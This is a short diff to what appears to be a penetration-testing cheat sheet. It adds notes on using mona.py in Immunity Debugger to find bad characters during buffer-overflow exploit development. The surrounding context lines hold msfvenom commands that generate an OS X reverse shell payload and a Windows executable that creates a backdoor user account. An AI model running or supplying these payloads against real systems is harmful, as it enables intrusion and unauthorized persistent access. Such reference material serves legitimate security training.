@@ -2806,10 +2806,12 @@ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<Local IP Address> LPORT=<Local Port
 Create User
 msfvenom -p windows/adduser USER=hacker PASS=Hacker123$ -f exe > adduser.exe
 
-
+https://bulbsecurity.com/finding-bad-characters-with-immunity-debugger-and-mona-py/
 BOF using mona.py compare
 
-01CBA154 = address of after the EIP memory
+01CBA154 = address of start of badchar
+
+!mona bytearray - generate the bin file for debugger to compare
 
 !mona compare -f C:\Program Files\Immunity Inc\Immunity Debugger\bytearray.bin -a 01CBA154(address of the start of your badchar placement)
 
